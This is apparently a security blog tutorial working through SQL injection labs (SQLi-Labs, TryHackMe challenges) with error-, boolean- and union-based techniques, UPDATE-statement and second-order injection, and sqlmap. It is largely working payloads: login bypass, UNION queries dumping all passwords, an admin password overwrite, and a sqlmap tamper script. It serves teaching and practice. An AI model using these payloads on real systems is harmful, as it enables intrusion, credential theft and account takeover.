---
layout: single
title: SQLi
excerpt: A SQL injection attack consists of the injection of a SQL query to the remote web application. A successful SQL injection exploit can read sensitive data from the database usernames and passwords, modify database data Add and Delete, execute administration operations on the database such as shutdown the database, and in some cases execute commands on the operating system. 
date: 2021-08-31
classes: wide
header:
  teaser: /assets/images/security.jpg
categories:
  - Blue Team
  - infosec
tags:
  - Blue Team
  - Red Team
---

## Basics of SQL language

As seen from Wikipedia,

https://en.wikipedia.org/wiki/Database

"A database is an organized collection of data, generally stored and accessed electronically from a computer system." There a lot of different database types such as MySQL, PostgreSQL, and so on.

SQL by itself is a domain-specific language used in programming for managing databases by reading operating data. 


SQL Crash Course
In order to understand SQLi, we first need to understand some basics of the SQL language. As far, as SQLi goes, we mainly focus on getting information from the database, this room will give you a basis for that. 

In SQL, in order to choose some data, we use SELECT, FROM, and WHERE. As you might have guessed SELECT allows us to select an object from (FROM) database and choose a specific data using WHERE. 

For example, if we have a database called colors and we want to select all colors from the list, we would use this syntax:: 

```
SELECT * FROM colors; 
```

Or if you have a database food with different meals followed by calories you could choose all meals with more than 50 calories: 
```
SELECT * FROM food WHERE calories > 50;
```

##  What is SQLi

A SQL injection attack consists of the injection of a SQL query to the remote web application. 

A successful SQL injection exploit can read sensitive data from the database (usernames & passwords), modify database data (Add/Delete), execute administration operations on the database (such as shutdown the database), and in some cases execute commands on the operating system. 



SQLi injections put server confidentiality under serious risk and can allow bypassing authentication processes or even get access to high-privilege accounts.



Letâ€™s take a look at this simple PHP input function:

![image](https://user-images.githubusercontent.com/89842187/132927895-c081b864-5ca9-45be-bb0d-af48d0a0bf67.png)

If we look at the $username variable, under normal operation we might expect the username parameter to be a real username. The function takes a username and chooses data related to it in the users database.



A malicious user (hacker or pentester) might submit some different kinds of data. For example, what happened if we input '? (Single quote)

The application would crash because the resulting SQL query is incorrect. 

![image](https://user-images.githubusercontent.com/89842187/132927904-278942eb-80de-4825-980f-48bbe1084280.png)

As you see here, inputted " ' " simply creates triple " ' " and produces an error. This error can in fact output some sensitive information or simply give a clue about database structure.



But what happens if we try to input ' OR 1=1 ?

![image](https://user-images.githubusercontent.com/89842187/132927934-cb47c9c7-4973-4e65-bf10-6fe22d6d9ca4.png)

This will produce a different scenario. 1=1 is treated as true in SQL language and therefore will return us every single row in the table. 



'-- will also do a job here. This payload transforms a username to an empty string to break out of the query and then adds a comment (--) that hides the second single quote making the database return data. We will discuss this more in-depth in Unit 5.

## How to detect SQLi


Manual - PHP parameter

As we saw in the previous unit, SQL injection is carried out by entering a malicious input to hijack an SQL query. The most common example is abusing a PHP GET parameter (for example $username, or $id) in the URL of a vulnerable web page. Those are usually located in the search fields and login pages, so as a penetration tester, you need to note those down.

So, now after you got all the PHP GET parameters and login pages you can actually proceed to detecting SQLi. Similarly to the previous unit, we want to cause a certain error displaying at least a small error message (which can even disclose some information, like a database type).

Let's try that by using SQLi Labs.
Browse to 10.10.9.46/sqli-labs/Less-1/

![image](https://user-images.githubusercontent.com/89842187/132928014-f5f50d8f-4e61-466a-ad73-2831bb8b37d6.png)

As a hint, it's asking us to "Input the ID as parameter with numeric value" (exactly the PHP GET parameter we are looking for).
```
10.10.9.46/sqli-labs/Less-1/index.php?id=1
```
Giving 1 as id value outputs a standard username and password, but that's not something we are looking for. Let's input apostrophe instead of 1.
```
10.10.9.46/sqli-labs/Less-1/index.php?id='
```
![image](https://user-images.githubusercontent.com/89842187/132928028-d1cf0f5d-944d-40a4-ade4-18e53050aa21.png)

##Automatic - Damn Small SQLi Scanner

Github: https://github.com/stamparm/DSSS 

Quick install: git clone https://github.com/stamparm/DSSS.git && cd DSSS/

Damn Small SQLi Scanner is an awesome little python script that allows us to check for SQLi vulnerability. Simply provide it with a link to the PHP parameter to run it.
Main syntax: 
```
python3 dsss.py -u "LINK"
```
Let's try it on our SQLi labs!
Simply run the script against 10.10.9.46/sqli-labs/Less-1/index.php?id= and see what happens.

![image](https://user-images.githubusercontent.com/89842187/132928100-e50c1911-5a59-4ea1-8535-1d2379b15716.png)

Oh wow! It did not only detect the vulnerability but provided us with the database type and suggested possible exploitation types.


## Error Based SQLi

## Definition 

Error-based SQLi is a SQL Injection technique that relies on error messages which are used to retrieve any sensitive information. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database.


# Approach

So, as seen from the definition, we actually want to create a SQL error, displaying some sensitive content. As you might have seen in Unit 4, we were able to get the database type by creating an error. Now we need to go beyond that and get something more interesting.

Of course, to make your life easier, at this point you would actually fuzz the SQL vulnerable link with a wordlist and most likely get the desired result. But for the purpose of this room, we are going to actually see how manually develop the payload using the understanding of SQL language. I have linked some useful payload lists and blogs in Unit 9 so you can practice fuzzing.


## Manual exploitation - SQLi Labs Lesson 1

Browse to lesson 1 on the sqli labs machine and include the id=1 parameter just like we did in the previous unit.
Let's look at what we got here.

![image](https://user-images.githubusercontent.com/89842187/132928404-ba183285-dde3-4916-8653-be50b4c01afe.png)

When we put the id parameter as some value, we instantly get a Login name and password. Let's think of that in terms of SQL language.
This id parameter is attached to a certain username (login name) and password which are being chosen from the database.
This how it would look in terms of SQL language:


```
select login_name, password from table where id=

```

See, just by looking at the basic output, we were able to retrieve some common SQL patterns. Now, as a part of error-based SQLi, we can exploit it.

Note here: Try inputting something other than numbers and see what happens. Also, try inputting some big numbers. Think about it and ask yourself if it tells us about anything.

Now try inputting 1' as the id parameter and let's analyze the error closely.

```
syntax to use near ''1'' LIMIT 0,1' at line 1


```

We can see that the web app is producing an error due to four single quotes around the 1
As in Unit 3, we can understand that error as 'one extra' single quote which cannot be recognized by the system.

What do I mean by that? Well, in this case when the application is taking the id input, it is putting it between two single quotes like so:

```
' 1 '
```
But when we input 1' we produce this scenario:

```
' 1' '
```

We are, in a way, closing the first single quote, at the same time creating the third. This, later on, makes the system automatically close the third one, displaying syntax to use near ''1''error.

If you are still a bit confused about this, let's take a bit different approach.
Try inputting 1\ as the id value. This also produces an error with '1\', clearly showing that the id value is placed between single quotes.

What we can do about it?
Well, if we can close the single quotes that easily, it means that we are able to break out of the query and provide custom commands.

If you try putting AND 1=1 (which corresponds to true) after the single quote, we still get this error.
In order to get around that, we need to fix the query back. It's done by commenting out the rest by using -- and providing + as the blank space at the end.
The URI should look like this

```
10.10.9.46/sqli-labs/Less-1/index.php?id=1' AND 1=1 --+

```

![image](https://user-images.githubusercontent.com/89842187/132928435-354c15ee-af79-47fb-9f27-3f64eeb71e45.png)

Wonderful! The web application is displaying us content even though we injected some custom SQL code which should not be available for us.

![image](https://user-images.githubusercontent.com/89842187/132928439-65ad981d-84bd-4fb5-a95a-5f51cde6cd45.png)


So, to sum up, in error-based SQLi injection, we first, need to find a link or input form where we can create an error. Then, by inputting random things like single and double quotes, slashes, and backslashes we need to understand the common pattern and figure out the basic structure of SQL query. After that simply abuse your acquired knowledge to exploit the app and get what you wanted.

A small payload collection can be found here:
https://github.com/payloadbox/sql-injection-payload-list#generic-sql-injection-payloads


#  Boolean based SQLi


## Definition

Boolean-based SQL Injection relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query gave a TRUE or FALSE result. Depending on the result, the content of the HTTP response will change, or remain the same (Change in HTTP response usually stands for a FALSE response, while TRUE does not affect anything). This allows an attacker to understand if the payload used returned true or false, even though no data from the database is returned.


## Approach

The boolean based sqli is usually carried out in a blind situation. Blind, in this case, means that there's no actual output and that we cannot see any error message (like we did previously).

Blind query breaking - SQLi Labs Lesson 8

Browse to 10.10.9.46/sqli-labs/Less-8/?id= and let's take a look.
Inputting single or a double quote doesn't produce any result, same as slashes. This gives us the idea of the blindness of our sql injection (or even absence of vulnerability at all). In this situation, we'll have to practically guess the query and exploit the database right away.

Make the id parameter equal to 1. We now see a message:
You are in...........

Now, let's blindly assume that the same as in the previous unit, putting 1' as the id value would produce some error.
```
10.10.9.46/sqli-labs/Less-8/?id=1'
```
And it did! We didn't see the error message but the message disappeared meaning that we were actually able to produce some sort of error. Now, fix the query by putting --+

```
10.10.9.46/sqli-labs/Less-8/?id=1' --+
```
Wonderful! The message is back. See what happened here, even though we are not able to see any SQL output, by making some simple assumption we were able to find a similar pattern as in the previous unit.

But the difference is that boolean sqli relies on the concept of True-False relation. Let's see how it works here. 
Put OR 1 in the link like so: 
```
10.10.9.46/sqli-labs/Less-8/?id=1' OR 1 --+, 
```

representing the True value. 
We still see the message.
Putting OR 0 won't logically display the message directly proving our ability to perform an SQL injection attack


## Exploitation

Well, now as we can only return True (You are in...........) or False (no message) statements, we need to start playing the game of yes-no with the database. By asking 'questions' about the database length and table quantity we can dump and enumerate the database. 

At this point, it is important to understand that in SQL language we can actually use =, <, > to compare the values. 
Try putting different comparison values in your link
```
10.10.9.46/sqli-labs/Less-8/?id=1' OR 1 < 2 --+ = True
```
or
```
10.10.9.46/sqli-labs/Less-8/?id=1' OR 1 > 2 --+ = False
```
This comparison can be actually helpful for us in asking those 'questions'.

For this particular room let's try to get the database's name using blind sql injection.

In sql language, there's a really useful function called SUBSTR() which extracts a substring from a string (starting at any position). 
It takes 3 input values:
1. Operated text (in our case database name)
2. Character to start with
3. Number of characters to extract

For example, running SELECT SUBSTR("Strange Fox", 5, 3) will return us nge.

Then, our SQLi payload would look like that:

```
AND (substr((select database()),1,1)) - this will return us the first character of the database name. 
```
Now, what we need to do is literally guess the character by trying to compare that payload to some letters.
Theoretically, the payload would look like that
```
1' substr((select database()),1,1)) = s --+
```
Happily for us, there's a way to avoid using characters and actually speed things up (instead of fuzzing the whole alphabet). If we add ascii() function before the payload, we'll be able to compare it to ascii character values. 
```
10.10.9.46/sqli-labs/Less-8/?id=1' AND (ascii(substr((select database()),1,1))) = 115 --+
```
This will once again return us You are in........... because s letter corresponds to 115 in ASCII.

Of course, in the real world we cannot simply guess that so we need to use > and < operators to compare the value of the characters to their ASCII values. 

Now try guessing the second letter using the comparison technique.

Hint:
```
10.10.9.46/sqli-labs/Less-8/?id=1' AND (ascii(substr((select database()),2,1))) < 115 --+
```


# Union Based SQLi

https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/

## Definition

Union-based SQLi is a SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.


## aproach 

The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example:
```

SELECT 1, 2 FROM usernames UNION SELECT 1, 2 FROM passwords

```

This SQL query will return a single result taken from 2 columns: first and second positions from usernames and passwords.

UNION SQLi attack consists of 3 stages:
1. You need to determine the number of columns you can retrieve.
2. You make sure that the columns you found are in a suitable format
3. Attack and get some interesting data.

> Determining the number of columns required in an SQL injection UNION attack

There are exactly two ways to detect one:
The first one involves injecting a series of ORDER BY queries until an error occurs. For example:
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# and so on until an error occurs
```
(The last value before the error would indicate the number of columns.)

The second one (most effective in my opinion), would involve submitting a series of UNION SELECT payloads with a number of NULL values:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
# until the error occurs
```
No error = number of NULL matches the number of columns.

> Finding columns with a useful data type in an SQL injection UNION attack

Generally, the interesting data that you want to retrieve will be in string form. Having already determined the number of required columns, (for example 4) you can probe each column to test whether it can hold string data by replacing one of the UNION SELECT payloads with a string value. In case of 4 you would submit:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
No error = data type is useful for us (string).

> Using an SQL injection UNION attack to retrieve interesting data

When you have determined the number of columns and found which columns can hold string data, you can finally start retrieving interesting data.

Suppose that:

* The first two steps showed exactly two existing columns with the useful datatype. 
* The database contains a table called users with the columns username and password.
    (This can be figured out by using the boolean technique from Unit 6)

In this situation, you can retrieve the contents of the user's table by submitting the input:
```
' UNION SELECT username, password FROM users --
```
Practice

Go ahead the deploy the provided machine at the beginning of the task. Browse to 10.10.9.46:3000
A given small lab is a highly vulnerable web application, with a lot of misconfigurations and developer mistakes.

![image](https://user-images.githubusercontent.com/89842187/132931892-11a2a287-3fcd-4065-8d9d-0af9c5301335.png)

First, browse to 10.10.9.46:3000/resetdb.php to set up the database. 
Then, go to 10.10.9.46:3000/register.php and register a new account. Make sure you input something interesting, as you'll be able to interact with that data later on! (Question 4)

Now let's proceed to the main objective - exploiting the web app. A vulnerable search field is located at 10.10.9.46:3000/searchproducts.php

![image](https://user-images.githubusercontent.com/89842187/132931898-00448854-7a91-4f47-976a-5854d2902c03.png)

Let's start our exploitation process! 
As you might remember, we, first, need to determine the number of available columns by inputting a series of
' UNION SELECT NULL -- into the search field. 
To spice things up, I've configured the database to also throw an error when having a -- at the end. To bypass that, we need to include an additional comment after the --. You can use either // or /* do bypass that configuration.

![image](https://user-images.githubusercontent.com/89842187/132931900-fd8f39aa-3708-4306-8b84-54c5da7f82e4.png)

As you can see on the screenshot above, a single NULL value causes an error, meaning that there are more columns. Try inputting NULL values until you finally get the number. Note it down to answer the questions later on. 

Now, try inputting 'a' instead of random NULL values and see if there's an error. An error will indicate that the given column format is not suitable for us and cannot be exploited.


![image](https://user-images.githubusercontent.com/89842187/132931906-dfb89596-4ca7-4731-9f17-eb98dedfe44b.png)

Finally, we can start getting some valuable information. Simply replace some null values with SQL keywords to get information about the database.
Here's a small list of thing you'd want to retrieve:
```
1. database()
2. user()
3. @@version
4. username
5. password
6. table_name
7. column_name
```


## Automating exploitation


# SQLmap
Project link: http://sqlmap.org/ 
Github: https://github.com/sqlmapproject/sqlmap 

sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

sqlmap is truly an awesome tool that can be extremely handy for us. Even though it is not allowed to use it during the OSCP exam, nothing restricts us from using it for our pen-tests and tryhackme rooms.

Quick install:
```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```
Print out the help page by running sqlmap --help and can take a closer look.

![image](https://user-images.githubusercontent.com/89842187/132937482-e3e99145-8903-41e9-a292-c1e86547a415.png)

Command examples:

https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet 

All-in-one cheat sheet:

https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ 


Now, when we are a bit more familiar with sqlmap let's practice using it. 
Go back to sqli labs lesson 1 and input the link to sqlmap.
```
sqlmap --url "10.10.42.178/sqli-labs/Less-1/index.php?id=" --batch
```

![image](https://user-images.githubusercontent.com/89842187/132937495-9de94455-b8b6-4fa4-8def-bd4eac4532a6.png)


## File SQL

Check that you have caught a request similar to the screenshot above. 
Right-click on the request and choose 'Save item'. Now when we have a saved request let's go ahead and connect sqlmap here.

Go to the request location (where you saved it) and open up a terminal.
type sqlmap -r {request} --batch (replace {request} with your file name).

![image](https://user-images.githubusercontent.com/89842187/132937500-a44567a9-03e1-4ee0-8bff-404d747f13f1.png)


## BYPASS

```
-- -
//
'1' OR '1'='1'-- -

```

# SQL Injection Attack on an UPDATE Statement

 If a SQL injection occurs on an UPDATE statement, the damage can be much more severe as it allows one to change records within the database. In the employee management application, there is an edit profile page as depicted in the following figure.
 If a SQL injection occurs on an UPDATE statement, the damage can be much more severe as it allows one to change records within the database. In the employee management application, there is an edit profile page as depicted in the following figure.

This edit page allows the employees to update their information, but they do not have access to all the available fields, and the user can only change their information. If the form is vulnerable to SQL injection, an attacker can bypass the implemented logic and update fields they are not supposed to, or for other users.

We will now enumerate the database via the UPDATE statement on the profile page. We will assume we have no prior knowledge of the database. By looking at the web page's source code, we can identify potential column names by looking at the name attribute. The columns don't necessarily need to be named this, but there is a good chance of it, and column names such as "email" and "password" are not uncommon and can easily be guessed.

![image](https://user-images.githubusercontent.com/89842187/133097401-a1048d59-415f-4f6c-a15d-744376ecd9d2.png)

To confirm that the form is vulnerable and that we have working column names, we can try to inject something similar to the code below into the nickName and email field:

```
asd',nickName='test',email='hacked

```
When injecting the malicious payload into the nickName field, only the nickName is updated. When injected into the email field, both fields are updated:

![image](https://user-images.githubusercontent.com/89842187/133097453-7d8c31f3-5d01-410e-a7b9-faed35d53daf.png)

The first test confirmed that the application is vulnerable and that we have the correct column names. If we had the wrong column names, then non of the fields would have been updated. Since both fields are updated after injecting the malicious payload, the original SQL statement likely looks something similar to the following code:

```
UPDATE <table_name> SET nickName='name', email='email' WHERE <condition>

```
With this knowledge, we can try to identify what database is in use. There are a few ways to do this, but the easiest way is to ask the database to identify itself. The following queries can be used to identify MySQL, MSSQL, Oracle, and SQLite:

```
# MySQL and MSSQL
',nickName=@@version,email='
# For Oracle
',nickName=(SELECT banner FROM v$version),email='
# For SQLite
',nickName=sqlite_version(),email='
```

Injecting the line with "sqlite_version()" into the nickName field shows that we are dealing with SQLite and that the version number is 3.27.2:

![image](https://user-images.githubusercontent.com/89842187/133097535-d1ff4769-ac0f-4e2d-95fe-89ccc7e4a3c3.png)


Knowing what database we are dealing with makes it easier to understand how to construct our malicious queries. We can proceed to enumerate the database by extracting all the tables. In the code below, we perform a subquery to fetch all the tables from database and place them into the nickName field. The subquery is enclosed inside parantheses. The group_concat() function is used to dump all the tables simultaneously.

"The group_concat() function returns a string which is the concatenation of all non-NULL values of X. If parameter Y is present then it is used as the separator between instances of X. A comma (",") is used as the separator if Y is omitted. The order of the concatenated elements is arbitrary."
```
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
```

By injecting the code above, we can see that the only table in the database is called "usertable":

![image](https://user-images.githubusercontent.com/89842187/133097582-fc686fbc-805e-45dc-8d21-d825d69ab711.png)

We can then continue by extract all the column names from the usertable:

```
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='

```

And as can be seen below, the usertable contains the columns: UID, name, profileID, salary, passportNr, email, nickName, and password:

![image](https://user-images.githubusercontent.com/89842187/133097646-362956b0-6f78-46be-a6a1-fce8219171b2.png)

By knowing the names of the columns, we can extract the data we want from the database. For example, the query below will extract profileID, name, and passwords from usertable. The subquery is using the group_concat() function to dump all the information simultaneously, and the || operator is "concatenate" - it joins together the strings of its operands (sqlite.org).

',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='

![image](https://user-images.githubusercontent.com/89842187/133097674-ca0b58c6-461f-4a61-afa7-43c30be0a26f.png)


After having dumped the data from the database, we can see that the password is hashed. This means that we will need to identify the correct hash type used if we want to update the password for a user. Using a hash identifier such as hash-identifier, we can identify the hash as SHA256:

![image](https://user-images.githubusercontent.com/89842187/133097706-82437371-f1e3-4613-9c25-c00b27a6bb57.png)

There are multiple ways of generating a sha256 hash. For example, we can use https://gchq.github.io/CyberChef/:

![image](https://user-images.githubusercontent.com/89842187/133097729-452b8423-1fcd-4840-b832-04ef50d4f0b8.png)

We can then update the password for the Admin user with the following code:


```
', password='008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'-- -

```

# Vulnerable broken authentication

## Description
The login form is still vulnerable to SQL injection, and it is possible to bypass the login by using ' OR 1=1-- - as a username.

Before dumping all the passwords, we need to identify places where results from the login query is returned within the application. After logging in, the name of the currently logged-on user is displayed in the top right corner, so it might be possible to dump the data there, as seen here:

![image](https://user-images.githubusercontent.com/89842187/133133740-e1d805e7-329f-4dc4-9c68-85cfe2e2df95.png)

Data from the query could also be stored in the session cookie. It is possible to extract the session cookie by opening developer tools in the browser, which can be done by pressing F12. Then navigate to Storage and copy the value of the session cookie, as seen here:

![image](https://user-images.githubusercontent.com/89842187/133133767-15bba673-a3c5-42b0-93a6-b153a37bf9f0.png)

Then it is possible to decode the cookie at https://www.kirsle.net/wizards/flask-session.cgi or via a custom script. A script to decode the cookie can be downloaded inside the VM by going to http://10.10.207.149:5000/download/decode_cookie.py.

After having logged in with ' OR 1=1-- - as username, the decoded cookie can be seen below, and it is clear that the user id and username from the login query are placed inside it.

```
{
    "challenge2_user_id": 1,
    "challenge2_username": "admin"
}
```

It is possible to dump the passwords by using a UNION based SQL injection. There are two key requirements that must be met for a UNION based injection to work:

- The number of columns in the injected query must be the same as in the original query
- The data types for each column must match the corresponding type

When logging in to the application, it executed the query below. From the SQL statement, we can see that it is retrieving two columns; id and username.

```
SELECT id, username FROM users WHERE username = '" + username + "' AND password = '" + password + "'

```

Without knowing the number of columns upfront, the attacker must first enumerate the number of columns by systematically injecting queries with different numbers of columns until it is successful. For example:


```
 1' UNION SELECT NULL-- -
 1' UNION SELECT NULL, NULL-- -
 1' UNION SELECT NULL, NULL, NULL-- -
```

In this case, successful means that the application will successfully login when the correct number of columns is injected. In other cases, if error messages are enabled, a warning might be displayed saying "SELECTs to the left and right of UNION do not have the same number of result columns" when incorrect number of columns are injected.

By using ' UNION SELECT 1,2-- - as username, we match the number of columns in the original SQL query, and the application lets us in. After logging in, we can see that the username is replaced with the integer 2, which is what we used as column two in the injected query.

![image](https://user-images.githubusercontent.com/89842187/133133868-51176965-f5c2-4060-a953-0048313f32e5.png)

The same goes for the username in the session cookie. By decoding it, we can see that the username has been replaced with the same value as above.

```
{
    "challenge2_user_id": 1,
    "challenge2_username": 2
}
```
Enumerate the database to find tables and columns, as we did under Task 2 Introduction to SQL Injection. A cheat sheet such as PayloadsAllTheThings can be helpful for this. The challenge's objective was to dump all the passwords to get the flag, so in this case, we will guess that the column name is password and that the table name is users. With this logic, it is possible to dump the passwords with the following code:

```
' UNION SELECT 1, password from users-- -
```

However, the previous statement will only return one password. The group_concat() function can help achieve the goal of dumping all the passwords simultaneously. 
By injecting the following code into the username field:

```
' UNION SELECT 1,group_concat(password) FROM users-- -

```

All the passwords are dumped:

![image](https://user-images.githubusercontent.com/89842187/133133970-2a4aa764-c9af-4e39-9605-130316b1a143.png)

The passwords can also be retrieved by decoding the Flask session cookie:

```
{
    "challenge2_user_id": 1,
    "challenge2_username": "rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{AuTh2},viking123"
}
```

## BLINDSQL SQLMAP

```
sqlmap -u http://10.10.110.236:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump
```
# Vuln Notes

## Description
By registering a new account and logging in to the application, the user can navigate to the new note function by clicking "Notes" in the top left menu. Here, it is possible to add new notes, and all the user's notes are listed on the bottom of the page, as seen here:

![image](https://user-images.githubusercontent.com/89842187/133154171-097de5bc-c896-4804-8087-2624a8a95b84.png)

The notes function is not directly vulnerable, as the function to insert notes is safe because it uses parameterized queries. With parameterized queries, the SQL statement is specified first with placeholders (?) for the parameters. Then the user input is passed into each parameter of the query later. Parameterized queries allow the database to distinguish between code and data, regardless of the input.

```
INSERT INTO notes (username, title, note) VALUES (?, ?, ?)

```

Even though parameterized queries are used, the server will accept malicious data and place it in the database if the application does not sanitize it. Still, the parameterized query prevents the input from leading to SQL injection. Since the application might accept malicious data, all queries must use parameterized queries, and not only for queries directly accepting user input.

The user registration function also utilizes parameterized queries, so when the query below is executed, only the INSERT statement gets executed. It will accept any malicious input and place it in the database if it doesn't sanitize it, but the parameterized query prevents the input from leading to SQL injection.

```
INSERT INTO users (username, password) VALUES (?, ?)
```

However, the query that fetches all of the notes belonging to a user does not use parameterized queries. The username is concatenated directly into the query, making it vulnerable to SQL injection.

```
SELECT title, note FROM notes WHERE username = '" + username + "'

```

This means that if we register a user with a malicious name, everything will be fine until the user navigates to the notes page and the unsafe query tries to fetch the data for the malicious user.

By creating a user with the following name:

```
' union select 1,2'
```
![image](https://user-images.githubusercontent.com/89842187/133154274-89551b54-c110-4a7e-865e-f63c17953893.png)

With this username, the application performs the following query:
```
SELECT title, note FROM notes WHERE username = '' union select 1,2''
```
Then on the notes page as the new user, we can see that the first column in the query is the note title, and the second column is the note itself:

![image](https://user-images.githubusercontent.com/89842187/133154353-5a8c3a0d-6089-4258-8cc4-2b13b803e5e8.png)

With this knowledge, this is rather easy to exploit. For example, to get all the tables from the database, we can create a user with the name:

```
' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''

```

To find the flag among the passwords, register a user with the name:

```
'  union select 1,group_concat(password) from users'

```

Automating Exploitation Using Sqlmap
It is possible to use sqlmap to automate this attack, but a standard attack with sqlmap will fail. The injection happens at the user registration, but the vulnerable function is located on the notes page. For sqlmap to exploit this vulnerability, it must do the following steps:

- Register a malicious user
- Login with the malicious user
- Go to the notes page to trigger the injection

It is possible to achieve all of the necessary steps by creating a tamper script. Sqlmap supports tamper scripts, which are scripts used for tampering with injection data. With a tamper script, we can easily modify the payload, for example, adding a custom encoding to it. It also allows us to set other things, such as cookies. 

There are two custom functions in the tamper script below. The first function is create_account(), which register a user with sqlmap's payload as name and 'asd' as password. The next custom function is login(), which logs sqlmap in as the newly created user and returns the Flask session cookie. tamper() is the main function in the script, and it has the payload and **kwargs as arguments. **kwargs holds information such as the HTTP headers, which we need to place the Flask session cookie onto the request to allow sqlmap to go to the notes page to trigger the SQL injection. The tamper() function first gets the headers from kwargs, then creates a new user on the application, and then it logs in to the application and sets the Flask session onto the HTTP header object.

```

#!/usr/bin/python
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

address = "http://10.10.1.134:5000/challenge4"
password = "asd"

def dependencies():
    pass

def create_account(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": password}
        resp = s.post(f"{address}/signup", data=data)

def login(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": password}
        resp = s.post(f"{address}/login", data=data)
        sessid = s.cookies.get("session", None)
    return "session={}".format(sessid)


def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    create_account(payload)
    headers["Cookie"] = login(payload)
    return payload

```

The folder where the tamper script is located will also need an empty __init__.py  file for sqlmap to be able to load it. Before starting sqlmap with the tamper script, change the address and password variable inside the script. With this done, it is possible to exploit the vulnerability with the following command:

sqlmap --tamper so-tamper.py --url http://10.10.1.134:5000/challenge4/signup  --data "username=admin&password=asd" 
```
--second-url http://10.10.1.134:5000/challenge4/notes  -p username --dbms sqlite --technique=U --no-cast

# --tamper so-tamper.py - The tamper script
# --url - The URL of the injection point, which is /signup in this case
# --data - The POST data from the registraion form to /signup. 
#   Password must be the same as the password in the tamper script
# --second-url http://10.10.1.134:5000/challenge4/notes - Visit this URL to check for results
# -p username - The parameter to inject to
# --dbms sqlite - To speed things up
# --technique=U - The technique to use. [U]nion-based
# --no-cast - Turn off payload casting mechanism

```

Dumping the users table might be hard without turning off the payload casting mechanism with the --no-cast parameter. An example of the difference between casting and no casting can be seen here:

```
-- With casting enabled:
admin' union all select min(cast(x'717a717071' as text)||coalesce(cast(sql as text),cast(x'20' as text)))||cast(x'716b786271' as text),null from sqlite_master 
where tbl_name=cast(x'7573657273' as text)-- daqo'
-- 7573657273 is 'users' in ascii

-- Without casting:
admin' union all select cast(x'717a6a7871' as text)||id||cast(x'6774697a7462' as text)||password||cast(x'6774697a7462' as text)||username||cast(x'7162706b71' as text),null 
from users-- ypfr'

```

When sqlmap asks, answer no to follow 302 redirects, then answer yes to continue further testing if it detects some WAF/IPS. Answer no when asked if you want to merge cookies in future requests, and say no to reduce the number of requests. As seen in the image below, sqlmap was able to find the vulnerability, which allows us to automate the exploitation of it.

![image](https://user-images.githubusercontent.com/89842187/133154538-62bd8b7b-2d6d-41cd-a9ff-4d70edf9916b.png)

## Change Password

Description
The developer has used a placeholder for the password parameter because this input comes directly from the user. The username does not come directly from the user but is rather fetched from the database based on the user id stored in the session object. Therefore, the developer has thought that the username was safe to use and concatenated it directly into the query instead of using a placeholder:

```
UPDATE users SET password = ? WHERE username = '" + username + "'
```

To exploit this vulnerability and gain access to the admin's user account, we can create a user with the name admin'-- -.

After having registered the malicious user, we can update the password for our new user to trigger the vulnerability. When changing the password, the application executes two queries. First, it asks the database for the username and password for our current user:

```
SELECT username, password FROM users WHERE id = ?
```
If all checks are fine, it will try to update the password for our user. Since the username gets concatenated directly into the SQL query, the executed query will look as follows:
```
UPDATE users SET password = ? WHERE username = 'admin' -- -'
```
This means that instead of updating the password for admin' -- -, the application updated the password for the admin user. After having updated the password, it is possible to log in as admin with the new password and view the flag.

#  Book Title

When the user first logs into the challenge, they are presented with a message saying: 

Testing a new function to search for books, check it out here
The 'here' text is a link taking the user to http://10.10.213.120:5000/challenge6/book?title=test, which is the page containing the vulnerable search function and can be seen here:

![image](https://user-images.githubusercontent.com/89842187/133165321-de71b674-42e4-4b1b-985f-bae9cfafbf1e.png)

The web page performs a GET request with the parameter title when searching for a book. The query it performs can be seen here:

```
SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '" + title + "%')

```
All we need to do to abuse this is closing the LIKE operand to the right of the LIKE operator. For example, we can dump all the books in the database by injecting the following command:

') or 1=1-- -

```
') union select 1,group_concat(username),group_concat(password),4 from users-- -
```
